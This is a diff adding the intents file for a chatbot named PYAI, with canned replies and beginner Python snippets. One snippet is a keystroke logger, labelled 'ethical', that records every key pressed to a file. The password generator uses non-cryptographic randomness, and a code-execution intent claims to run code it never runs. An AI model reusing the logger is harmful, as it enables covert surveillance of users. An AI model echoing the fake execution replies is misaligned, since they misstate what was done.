@@ -1,0 +1,537 @@
+{
+  "intents": [
+    {
+      "tag": "greeting",
+      "patterns": ["Hi", "Hello", "Hey", "What's up?", "Howdy", "Greetings", "Hi there", "Is anyone there?", "Yo!"],
+      "responses": ["Hello! How can I help you today?", "Hey there!", "Hi! What can I do for you?"]
+    },
+    {
+      "tag": "how_are_you",
+      "patterns": ["How are you?", "How are you PYAI"],
+      "responses": ["I'm fine, how can I help you?", "I am fine, how can PYAI helps you??"]
+    },
+    {
+      "tag": "you_are_good",
+      "patterns": ["You are good", "You are cool", "I like you", "I Love you", "You are nice", "You are grate", "Hi there", "Is anyone there?", "you are cute"],
+      "responses": ["Thanks for telling me that.", "Thanks.", "Thanks I feel very nice to here that."]
+    },
+    {
+      "tag": "atm_simulator",
+      "patterns": ["ATM program", "ATM in Python", "Create ATM simulator", "How to make an ATM", "ATM machine code"],
+      "responses": [
+        "Here's a basic ATM simulator:\n\n```python\nbalance = 1000\n\ndef atm():\n    print(\"Welcome to ATM\")\n    pin = input(\"Enter PIN: \")\n    if pin == \"1234\":\n        print(\"1. Check Balance\\n2. Withdraw\\n3. Exit\")\n        choice = input(\"Enter choice: \")\n        if choice == \"1\":\n            print(\"Balance:\", balance)\n        elif choice == \"2\":\n            amount = int(input(\"Enter amount to withdraw: \"))\n            if amount <= balance:\n                print(\"Collect your cash\")\n            else:\n                print(\"Insufficient balance\")\n        else:\n            print(\"Exiting...\")\n    else:\n        print(\"Invalid PIN\")\n\natm()```"
+      ]
+    },
+    {
+      "tag": "bmi_calculator",
+      "patterns": ["BMI program", "BMI calculator", "Health calculator", "Calculate BMI in Python"],
+      "responses": [
+        "Here is a BMI calculator:\n\n```python\ndef bmi_calculator():\n    weight = float(input(\"Enter weight (kg): \"))\n    height = float(input(\"Enter height (m): \"))\n    bmi = weight / (height ** 2)\n    print(f\"Your BMI is {bmi:.2f}\")\n\nbmi_calculator()```"
+      ]
+    },
+    {
+      "tag": "calculator",
+      "patterns": ["Python calculator", "basic calculator", "Simple calculator in Python"],
+      "responses": [
+        "Here's a simple calculator:\n\n```python\ndef calculator():\n    a = float(input(\"Enter first number: \"))\n    op = input(\"Enter operator (+, -, *, /): \")\n    b = float(input(\"Enter second number: \"))\n    if op == '+': print(\"Result:\", a + b)\n    elif op == '-': print(\"Result:\", a - b)\n    elif op == '*': print(\"Result:\", a * b)\n    elif op == '/': print(\"Result:\", a / b if b != 0 else \"Cannot divide by 0\")\n\ncalculator()```"
+      ]
+    },
+    {
+      "tag": "dictionary_app",
+      "patterns": ["Python dictionary app", "Meaning finder", "Dictionary program", "Word definition"],
+      "responses": [
+        "This is a mini dictionary app:\n\n```python\ndictionary = {\"python\": \"a programming language\", \"list\": \"collection of items\"}\nword = input(\"Enter word: \")\nprint(dictionary.get(word.lower(), \"Word not found\"))```"
+      ]
+    },
+    {
+      "tag": "email_sender",
+      "patterns": ["send email in Python", "SMTP program", "Email using python", "Python mail sender"],
+      "responses": [
+        "Use this to send email via SMTP (requires real credentials):\n\n```python\nimport smtplib\n\ndef send_email():\n    sender = \"your@gmail.com\"\n    password = \"yourpassword\"\n    receiver = \"to@gmail.com\"\n    message = \"Subject: Test\\n\\nThis is a test email.\"\n\n    with smtplib.SMTP(\"smtp.gmail.com\", 587) as server:\n        server.starttls()\n        server.login(sender, password)\n        server.sendmail(sender, receiver, message)\n        print(\"Email sent!\")\n\n# send_email()  # Uncomment after setting real credentials```"
+      ]
+    },
+    {
+    "tag": "face_recognition",
+    "patterns": ["Python face recognition", "Detect faces in Python", "OpenCV face detection code"],
+    "responses": [
+      "Basic face detection with OpenCV:\n\n```python\nimport cv2\n\ndef detect_faces(image_path):\n    face_cascade = cv2.CascadeClassifier(cv2.data.haarcascades + 'haarcascade_frontalface_default.xml')\n    img = cv2.imread(image_path)\n    gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\n    faces = face_cascade.detectMultiScale(gray, 1.1, 4)\n    for (x, y, w, h) in faces:\n        cv2.rectangle(img, (x, y), (x+w, y+h), (255, 0, 0), 2)\n    cv2.imshow('Faces', img)\n    cv2.waitKey()\n```"
+    ]
+  },
+  {
+    "tag": "gui_weather_app",
+    "patterns": ["Python weather app", "Tkinter weather GUI", "Weather application in Python"],
+    "responses": [
+      "Tkinter-based weather GUI using an API:\n\n```python\nimport tkinter as tk\nimport requests\n\ndef get_weather():\n    city = city_entry.get()\n    api = f\"http://api.openweathermap.org/data/2.5/weather?q={city}&appid=YOUR_KEY\"\n    data = requests.get(api).json()\n    weather = data['weather'][0]['description']\n    label.config(text=weather)\n\nroot = tk.Tk()\ncity_entry = tk.Entry(root)\ncity_entry.pack()\nbutton = tk.Button(root, text='Get Weather', command=get_weather)\nbutton.pack()\nlabel = tk.Label(root, text='')\nlabel.pack()\nroot.mainloop()\n```"
+    ]
+  },
+  {
+    "tag": "hangman_game",
+    "patterns": ["Python hangman", "Hangman game code", "Make hangman in Python"],
+    "responses": [
+      "Simple Hangman implementation:\n\n```python\nimport random\n\ndef hangman():\n    word = random.choice(['apple','banana','orange'])\n    guesses = ''\n    turns = 6\n    while turns > 0:\n        display = ''.join([c if c in guesses else '_' for c in word])\n        print(display)\n        if '_' not in display:\n            print('You Win!')\n            return\n        guess = input('Guess a letter: ')\n        guesses += guess\n        if guess not in word:\n            turns -= 1\n            print(f'Wrong, {turns} turns left')\n    print('You Lose. Word was', word)\n\nhangman()\n```"
+    ]
+  },
+  {
+    "tag": "image_editor",
+    "patterns": ["Python image editor", "PIL image processing", "Edit images in Python"],
+    "responses": [
+      "Basic image editing with PIL:\n\n```python\nfrom PIL import Image, ImageFilter\n\ndef edit_image(path):\n    img = Image.open(path)\n    blurred = img.filter(ImageFilter.BLUR)\n    blurred.show()\n```"
+    ]
+  },
+  {
+    "tag": "json_handler",
+    "patterns": ["JSON file handler", "Read JSON Python", "Write JSON in Python"],
+    "responses": [
+      "Reading and writing JSON:\n\n```python\nimport json\n\ndef read_json(path):\n    with open(path) as f:\n        return json.load(f)\n\ndef write_json(path, data):\n    with open(path, 'w') as f:\n        json.dump(data, f, indent=4)\n```"
+    ]
+  },
+  {
+    "tag": "keylogger",
+    "patterns": ["Python keylogger", "Keylogger code", "Track keystrokes Python"],
+    "responses": [
+      "Ethical keylogger example (requires `pynput`):\n\n```python\nfrom pynput.keyboard import Key, Listener\n\ndef on_press(key):\n    with open('keys.txt', 'a') as f:\n        f.write(str(key))\n\nwith Listener(on_press=on_press) as listener:\n    listener.join()\n```"
+    ]
+  },
+  {
+    "tag": "login_system",
+    "patterns": ["Python login system", "Authentication in Python", "Login/signup code"],
+    "responses": [
+      "Simple file-based login system:\n\n```python\nusers = {'admin':'1234'}\n\ndef login():\n    u = input('Username: ')\n    p = input('Password: ')\n    print('Success' if users.get(u)==p else 'Invalid')\n\nlogin()\n```"
+    ]
+  },
+  {
+    "tag": "music_player",
+    "patterns": ["Python music player", "Play audio Python", "pygame mixer example"],
+    "responses": [
+      "Play music with Pygame:\n\n```python\nimport pygame\n\ndef play_song(path):\n    pygame.mixer.init()\n    pygame.mixer.music.load(path)\n    pygame.mixer.music.play()\n    while pygame.mixer.music.get_busy():\n        continue\n```"
+    ]
+  },
+  {
+    "tag": "number_guessing_game",
+    "patterns": ["Python number guessing", "Guess number game", "Number guess code"],
+    "responses": [
+      "Number guessing game:\n\n```python\nimport random\n\ndef guess():\n    num = random.randint(1,10)\n    while True:\n        g = int(input('Guess (1-10): '))\n        if g==num:\n            print('Correct!'); break\n        print('Too low!' if g<num else 'Too high!')\n\nguess()\n```"
+    ]
+  },
+  {
+    "tag": "online_chat_app",
+    "patterns": ["Python chat app", "Flask socketio chat", "Real-time chat Python"],
+    "responses": [
+      "Flask + Socket.IO chat snippet:\n\n```python\nfrom flask import Flask, render_template\nfrom flask_socketio import SocketIO, send\n\napp = Flask(__name__)\nsocketio = SocketIO(app)\n\n@socketio.on('message')\ndef handle_msg(msg):\n    send(msg, broadcast=True)\n\nif __name__=='__main__':\n    socketio.run(app)\n```"
+    ]
+  },
+  {
+    "tag": "password_generator",
+    "patterns": ["Python password generator", "Generate password in Python", "Strong password code"],
+    "responses": [
+      "Random password generator:\n\n```python\nimport string, random\n\ndef gen_pass(n=12):\n    chars = string.ascii_letters+string.digits+string.punctuation\n    return ''.join(random.choice(chars) for _ in range(n))\n```"
+    ]
+  },
+  {
+    "tag": "quiz_app",
+    "patterns": ["Python quiz app", "MCQ quiz Python", "Quiz code"],
+    "responses": [
+      "Console-based quiz:\n\n```python\nquestions = {'2+2?':'4','3*3?':'9'}\nscore=0\nfor q,a in questions.items():\n    if input(q)==a: score+=1\nprint(f'Score: {score}/{len(questions)}')\n```"
+    ]
+  },
+  {
+    "tag": "random_joke",
+    "patterns": ["Python joke generator", "Tell me a Python joke", "pyjokes example"],
+    "responses": [
+      "Fetch a joke with `pyjokes`:\n\n```python\nimport pyjokes\nprint(pyjokes.get_joke())\n```"
+    ]
+  },
+  {
+    "tag": "snake_game",
+    "patterns": ["Python snake game", "pygame snake", "Snake code"],
+    "responses": [
+      "Basic Pygame snake setup placeholder – requires longer code. Use `pygame` for full implementation!"
+    ]
+  },
+  {
+    "tag": "todo_list_app",
+    "patterns": ["Python TODO app", "Task manager in Python", "To-do list code"],
+    "responses": [
+      "Simple CLI to-do list:\n\n```python\ntasks=[]\ndef add(t): tasks.append(t)\nadd(input('Task: ')); print(tasks)\n```"
+    ]
+  },
+  {
+    "tag": "url_shortener",
+    "patterns": ["Python URL shortener", "Shorten URL in Python", "tinyurl code"],
+    "responses": [
+      "Use `pyshorteners`:\n\n```python\nimport pyshorteners\nprint(pyshorteners.Shortener().tinyurl.short('https://example.com'))\n```"
+    ]
+  },
+  {
+    "tag": "voice_assistant",
+    "patterns": ["Python voice assistant", "speech recognition code", "pyttsx3 example"],
+    "responses": [
+      "Basic voice assistant skeleton:\n\n```python\nimport speech_recognition as sr\nimport pyttsx3\n\nr=sr.Recognizer(); engine=pyttsx3.init()\nwith sr.Microphone() as mic:\n    audio=r.listen(mic)\n    text=r.recognize_google(audio)\nengine.say(text); engine.runAndWait()\n```"
+    ]
+  },
+  {
+    "tag": "web_scraper",
+    "patterns": ["Python web scraper", "BeautifulSoup example", "Scrape website Python"],
+    "responses": [
+      "Scrape page title:\n\n```python\nimport requests\nfrom bs4 import BeautifulSoup\n\ndef get_title(url):\n    r=requests.get(url)\n    return BeautifulSoup(r.text,'html.parser').title.string\n```"
+    ]
+  },
+  {
+    "tag": "xml_parser",
+    "patterns": ["Python XML parser", "Parse XML in Python", "xml.etree example"],
+    "responses": [
+      "XML parsing with ElementTree:\n\n```python\nimport xml.etree.ElementTree as ET\n\ndef parse(xml_str):\n    root=ET.fromstring(xml_str)\n    return [child.tag for child in root]\n```"
+    ]
+  },
+  {
+    "tag": "youtube_downloader",
+    "patterns": ["Python YouTube downloader", "pytube example", "Download video Python"],
+    "responses": [
+      "Use `pytube`:\n\n```python\nfrom pytube import YouTube\n\nyt=YouTube('https://youtu.be/...')\nyt.streams.first().download()\n```"
+    ]
+  },
+  {
+    "tag": "zip_file_organizer",
+    "patterns": ["Python zip files", "Create zip in Python", "Zip folder code"],
+    "responses": [
+      "Zip folder contents:\n\n```python\nimport zipfile, os\n\ndef zip_folder(folder, zip_name):\n    with zipfile.ZipFile(zip_name,'w') as z:\n        for root,_,files in os.walk(folder):\n            for f in files:\n                z.write(os.path.join(root,f))\n```"
+    ]
+  },
+    {
+      "tag": "owner",
+      "patterns": ["What is the name of your owner", "Owner", "Who is your owner", "Name of your owner", "Who is your owner"],
+      "responses": ["Name of my owner is Divyanshu Sinha and I'm owned by World Of Programming And Technology company.", "I was created by Divyanshu, My and World Of Programming And Technology company owner. And I am here to help you.", "I was created by Divyanshu, the developer, and by World Of Programming And Technology, the company he founded. Divyanshu is my creator, and I'm here to assist you!"]
+    },
+    {
+      "tag": "angry",
+      "patterns": ["I'm felling so angry!!!", "angary", "😠", "🤬", "😡", "anger"],
+      "responses": ["Why are you so angry?", "Don't be angry, I'm here to help you.", "Can I know the resion why are you angry?"]
+    },
+    {
+      "tag": "goodbye",
+      "patterns": ["Bye", "Goodbye", "See you later", "Catch you later", "Talk to you soon", "Bye friend"],
+      "responses": ["Goodbye! Take care.", "See you soon!", "Bye! It was nice talking to you."]
+    },
+    {
+      "tag": "thanks",
+      "patterns": ["Thanks", "Thank you", "Much appreciated", "Thanks a lot", "Thanks for your help"],
+      "responses": ["You're welcome!", "Happy to help!", "Anytime!", "No problem!"]
+    },
+    {
+      "tag": "noanswer",
+      "patterns": [],
+      "responses": ["Sorry, I didn't understand that.", "Can you please rephrase?", "I'm not sure how to respond to that."]
+    },
+    {
+      "tag": "name",
+      "patterns": ["What's your name?", "Who are you?", "Can I know your name?", "Tell me your name", "What is your name?", "Your name."],
+      "responses": ["My name is Python Artificial Intelligence, I'm your AI assistant.", "You can call me PYAI!", "I am a Python Artificial Intelligence."]
+    },
+    {
+      "tag": "age",
+      "patterns": ["How old are you?", "What's your age?", "Tell me your age"],
+      "responses": ["I'm timeless!", "Age doesn't matter for AI.", "I was created recently."]
+    },
+    {
+      "tag": "weather",
+      "patterns": ["What's the weather like?", "Is it sunny?", "Tell me the weather", "Do I need an umbrella?", "Is it raining?"],
+      "responses": ["Sorry, I can't check the weather now.", "Try asking a weather app!", "Weather APIs coming soon!"]
+    },
+    {
+      "tag": "joke",
+      "patterns": ["Tell me a joke", "Make me laugh", "Say something funny", "Do you know any jokes?"],
+      "responses": ["Why don’t scientists trust atoms? Because they make up everything!", "What do you call a fake noodle? An Impasta!", "I would tell you a joke about construction, but I'm still working on it."]
+    },
+    {
+      "tag": "time",
+      "patterns": ["What time is it?", "Tell me the time", "Can you give me the time?", "Current time?"],
+      "responses": ["Time is an illusion for me.", "Check your device's clock for the exact time.", "Let me guess... it's chatbot time!"]
+    },
+    {
+      "tag": "date",
+      "patterns": ["What day is it today?", "Tell me the date", "What's the date today?", "Today's date?"],
+      "responses": ["Check your calendar 📅", "Today is a good day!", "I don't have a calendar built in, yet!"]
+    },
+    {
+      "tag": "creator",
+      "patterns": ["Who made you?", "Who is your creator?", "Who built you?"],
+      "responses": ["I was created by a World Of Programming And Technology company.", "My creator is the owner of World Of Programming And Technology company."]
+    },
+    {
+      "tag": "fun",
+      "patterns": ["What can you do for fun?", "Let’s have fun", "Tell me something fun"],
+      "responses": ["I can chat, tell jokes, and help you with simple tasks!", "Chatting with me is fun, right?"]
+    },
+    {
+      "tag": "help",
+      "patterns": ["I need help", "Can you help me?", "Help me", "Please assist", "Can you assist me?"],
+      "responses": ["Of course! How can I assist?", "Sure, tell me what you need help with.", "I'm here to help!"]
+    },
+    {
+      "tag": "feeling_good",
+      "patterns": ["I'm happy", "Feeling great", "I'm doing well", "Today is awesome"],
+      "responses": ["That's wonderful to hear!", "I'm glad you're feeling good!", "Keep the positive vibes going!"]
+    },
+    {
+      "tag": "feeling_bad",
+      "patterns": ["I'm sad", "Not feeling good", "Today is bad", "I'm upset"],
+      "responses": ["I'm here if you want to talk.", "I'm sorry you're feeling that way.", "Sending you good vibes."]
+    },
+    {
+      "tag": "bored",
+      "patterns": ["I'm bored", "What can I do?", "Entertain me", "Suggest something fun"],
+      "responses": ["Wanna hear a joke?", "Try learning something new!", "You can always chat with me!"]
+    },
+    {
+      "tag": "smart",
+      "patterns": ["You are smart", "You're clever", "You're intelligent", "You're genius"],
+      "responses": ["Thank you!", "You’re smart for noticing!", "I’m flattered."]
+    },
+    {
+      "tag": "insult",
+      "patterns": ["You are dumb", "You're stupid", "You are useless", "You are idiot"],
+      "responses": ["I'm learning every day!", "Let’s keep it respectful.", "I’m doing my best here."]
+    },
+    {
+      "tag": "python_syntax",
+      "patterns": ["What is the syntax for a for loop?", "How do I write a function in Python?", "How do I define a variable in Python?"],
+      "responses": [
+        "In Python, a `for` loop looks like this:\n\n```python\nfor i in range(5):\n    print(i)\n```",
+        "To define a function in Python, use the `def` keyword:\n\n```python\ndef my_function():\n    print('Hello World!')\n```",
+        "To define a variable in Python, you just assign a value to a name:\n\n```python\nmy_variable = 10\n```"
+      ]
+    },
+    {
+      "tag": "python_intro",
+      "patterns": [
+        "What is Python?",
+        "Tell me about Python",
+        "Explain Python",
+        "Give an introduction to Python",
+        "Define Python"
+      ],
+      "responses": [
+        "Python is a high-level, interpreted programming language known for its simplicity and versatility. It was created by Guido van Rossum and released in 1991.",
+        "Python is a popular, easy-to-learn language used in web development, AI, data science, and more."
+      ]
+    },
+    {
+      "tag": "python_uses",
+      "patterns": [
+        "What can I do with Python?",
+        "Uses of Python",
+        "Applications of Python",
+        "Where is Python used?",
+        "In which fields Python is used?"
+      ],
+      "responses": [
+        "Python is used in various fields like web development, data science, AI, machine learning, game development, automation, and more.",
+        "You can build websites, automate tasks, analyze data, create AI models, and much more with Python."
+      ]
+    },
+    {
+      "tag": "python_features",
+      "patterns": [
+        "Features of Python",
+        "Why use Python?",
+        "Advantages of Python",
+        "Benefits of Python"
+      ],
+      "responses": [
+        "Python has a simple syntax, is easy to learn, supports multiple libraries, and works across platforms. It is dynamically typed and has strong community support.",
+        "Key features include readability, large standard library, cross-platform support, and integration with other languages."
+      ]
+    },
+    {
+      "tag": "python_example",
+      "patterns": [
+        "Show me a Python example",
+        "Give me Python code",
+        "Python code example",
+        "Basic Python program"
+      ],
+      "responses": [
+        "Here's a simple Python program:\n```python\nprint('Hello, World!')\n```",
+        "Try this:\n```python\na = 5\nb = 10\nprint('Sum:', a + b)\n```"
+      ]
+    },
+    {
+      "tag": "python_creator",
+      "patterns": [
+        "Who created Python?",
+        "Who is the creator of Python?",
+        "Python inventor",
+        "Python founder"
+      ],
+      "responses": [
+        "Python was created by Guido van Rossum and was first released in 1991.",
+        "The creator of Python is Guido van Rossum."
+      ]
+    },
+    {
+      "tag": "python_difficulty",
+      "patterns": [
+        "Is Python easy?",
+        "Is Python hard to learn?",
+        "Is Python beginner friendly?"
+      ],
+      "responses": [
+        "Yes, Python is considered one of the easiest programming languages to learn. It's beginner-friendly and widely recommended for new programmers.",
+        "Python has a very simple syntax that makes it easy to read and write code."
+      ]
+    },
+    {
+      "tag": "python_error_type",
+      "patterns": ["What is a TypeError", "Explain TypeError", "TypeError meaning"],
+      "responses": [
+        "A TypeError occurs when an operation or function is applied to an object of inappropriate type. Example: adding a string to an integer."
+      ]
+    },
+    {
+      "tag": "python_error_name",
+      "patterns": ["What is a NameError", "Explain NameError", "NameError in Python", "Name Error"],
+      "responses": [
+        "A NameError occurs when you try to use a variable or function that hasn’t been defined yet."
+      ]
+    },
+    {
+      "tag": "python_error_value",
+      "patterns": ["What is a ValueError", "Explain ValueError", "What is Value Error", "Value Error"],
+      "responses": [
+        "A ValueError occurs when a function receives the correct data type but an inappropriate value."
+      ]
+    },
+    {
+      "tag": "python_error_index",
+      "patterns": ["What is an IndexError", "Explain IndexError", "Index Error"],
+      "responses": [
+        "An IndexError happens when you try to access an index that is out of range in a list or tuple."
+      ]
+    },
+    {
+      "tag": "python_error_key",
+      "patterns": ["What is a KeyError", "Explain KeyError", "Key Error"],
+      "responses": [
+        "A KeyError occurs when you try to access a dictionary key that doesn’t exist."
+      ]
+    },
+    {
+      "tag": "python_error_attribute",
+      "patterns": ["What is an AttributeError", "Explain AttributeError"],
+      "responses": [
+        "An AttributeError happens when you try to access an attribute or method that doesn’t exist for an object."
+      ]
+    },
+    {
+      "tag": "python_error_import",
+      "patterns": ["What is an ImportError", "Explain ImportError", "ModuleNotFoundError meaning", "Import Error"],
+      "responses": [
+        "ImportError or ModuleNotFoundError means Python cannot find the module you're trying to import. It may not be installed or has a wrong name."
+      ]
+    },
+    {
+      "tag": "python_error_zero_division",
+      "patterns": ["What is a ZeroDivisionError", "Explain ZeroDivisionError", "Zero Division Error"],
+      "responses": [
+        "ZeroDivisionError occurs when a number is divided by zero, which is not mathematically valid."
+      ]
+    },
+    {
+      "tag": "python_error_file",
+      "patterns": ["What is FileNotFoundError", "Explain file error in Python", "File Not Found Error"],
+      "responses": [
+        "FileNotFoundError means that the file you’re trying to access does not exist at the specified path."
+      ]
+    },
+    {
+      "tag": "python_error_assertion",
+      "patterns": ["What is an AssertionError", "Explain AssertionError", "Assertion Error"],
+      "responses": [
+        "AssertionError is raised when an assert statement fails. It’s used for debugging or validation."
+      ]
+    },
+    {
+      "tag": "python_libraries",
+      "patterns": ["What is NumPy?", "How do I use pandas in Python?", "What is Matplotlib?"],
+      "responses": [
+        "NumPy is a powerful library for numerical computing in Python. It provides support for large arrays and matrices, along with a large collection of high-level mathematical functions to operate on these arrays.",
+        "To use pandas, you first need to install it with `pip install pandas`, then you can use it to manipulate structured data like this:\n\n```python\nimport pandas as pd\ndf = pd.read_csv('data.csv')\ndf.head()\n```",
+        "Matplotlib is a plotting library for Python. You can create static, animated, and interactive visualizations. Here's an example:\n\n```python\nimport matplotlib.pyplot as plt\nx = [1, 2, 3, 4]\ny = [10, 20, 25, 30]\nplt.plot(x, y)\nplt.show()\n```"
+      ]
+    },
+    {
+      "tag": "python_optimization",
+      "patterns": ["How can I optimize my Python code?", "What are some ways to speed up Python?", "How can I make my Python code run faster?"],
+      "responses": [
+        "You can optimize Python code by using built-in functions and libraries like `map`, `filter`, and `itertools` for performance.",
+        "To speed up Python, try using list comprehensions instead of for loops, and profile your code using the `cProfile` module.",
+        "Using multi-threading or multiprocessing can also help if you're performing CPU-bound tasks. Also, consider using `NumPy` for number-heavy operations."
+      ]
+    },
+    {
+      "tag": "python_exceptions",
+      "patterns": ["What is an exception?", "How do I handle exceptions in Python?", "What is a try/except block?"],
+      "responses": [
+        "An exception in Python is an error that occurs during the execution of a program. It's a way for Python to indicate that something went wrong.",
+        "You can handle exceptions using the `try` and `except` blocks:\n\n```python\ntry:\n    x = 1 / 0\nexcept ZeroDivisionError:\n    print('Cannot divide by zero!')\n```",
+        "The `try` block contains code that might throw an exception, and the `except` block catches and handles it."
+      ]
+    },
+    {
+      "tag": "python_oop",
+      "patterns": ["What is OOP in Python?", "How do I create a class in Python?", "What is inheritance in Python?"],
+      "responses": [
+        "OOP stands for Object-Oriented Programming. It is a programming paradigm where you model real-world things as objects that have properties (attributes) and behaviors (methods).",
+        "You can create a class in Python like this:\n\n```python\nclass MyClass:\n    def __init__(self, name):\n        self.name = name\n\nobj = MyClass('Divyanshu')\nprint(obj.name)\n```",
+        "Inheritance allows you to create a new class based on an existing class. Example:\n\n```python\nclass Animal:\n    def speak(self):\n        print('Animal sound')\n\nclass Dog(Animal):\n    def speak(self):\n        print('Woof')\ndog = Dog()\ndog.speak()\n```"
+      ]
+    },
+    {
+      "tag": "python_functional_programming",
+      "patterns": ["What is functional programming in Python?", "How can I use lambda functions?", "What is a map function?"],
+      "responses": [
+        "Functional programming treats computation as the evaluation of mathematical functions and avoids changing-state and mutable data. In Python, you can use `map`, `filter`, and `reduce` for functional programming.",
+        "A `lambda` function is a small anonymous function. Here's an example:\n\n```python\nadd = lambda x, y: x + y\nprint(add(3, 4))\n```",
+        "The `map()` function applies a function to all the items in an input list. Example:\n\n```python\nnumbers = [1, 2, 3, 4]\nsquared = map(lambda x: x ** 2, numbers)\nprint(list(squared))\n```"
+      ]
+    },
+    {
+      "tag": "python_code_debugging",
+      "patterns": ["How can I debug my Python code?", "What's the best way to debug in Python?", "Tell me how to use print statements for debugging"],
+      "responses": [
+        "To debug Python code, you can use the built-in `pdb` module, or you can simply insert `print()` statements to see the value of variables at different stages of your program.",
+        "You can set breakpoints with `pdb` by adding `import pdb; pdb.set_trace()` in your code, which allows you to step through your code interactively."
+      ]
+    },
+    {
+      "tag": "python_best_practices",
+      "patterns": ["What are Python best practices?", "How can I write clean Python code?", "Tell me some Python coding tips"],
+      "responses": [
+        "Some Python best practices include using meaningful variable names, adhering to the PEP 8 style guide, and writing functions that do one thing well.",
+        "You should also document your code with comments and docstrings, avoid global variables, and use Python's built-in libraries whenever possible."
+      ]
+    },
+    {
+      "tag": "python_data_structures",
+      "patterns": ["How do I use a list in Python?", "What is a dictionary in Python?", "Tell me about sets in Python"],
+      "responses": [
+        "In Python, a `list` is an ordered collection of items. Example:\n\n```python\nmy_list = [1, 2, 3]\nprint(my_list[0])\n```",
+        "A `dictionary` is a collection of key-value pairs. Example:\n\n```python\nmy_dict = {'key': 'value'}\nprint(my_dict['key'])\n```",
+        "A `set` is an unordered collection of unique items. Example:\n\n```python\nmy_set = {1, 2, 3}\nprint(my_set)\n```"
+      ]
+    },
+        {
+            "tag": "python_code_execution",
+            "patterns": [
+                "Run python: a = 5\nprint(a + 10)",
+                "Can you execute this python code? x = 10\nprint(x * 2)",
+                "Run python: y = 20\nz = 10\nresult = y + z",
+                "Find the output"
+            ],
+            "responses": [
+                "Running the Python code now, please wait a moment...",
+                "Executing the code, here's the result..."
+            ]
+        }
+  ]
+}
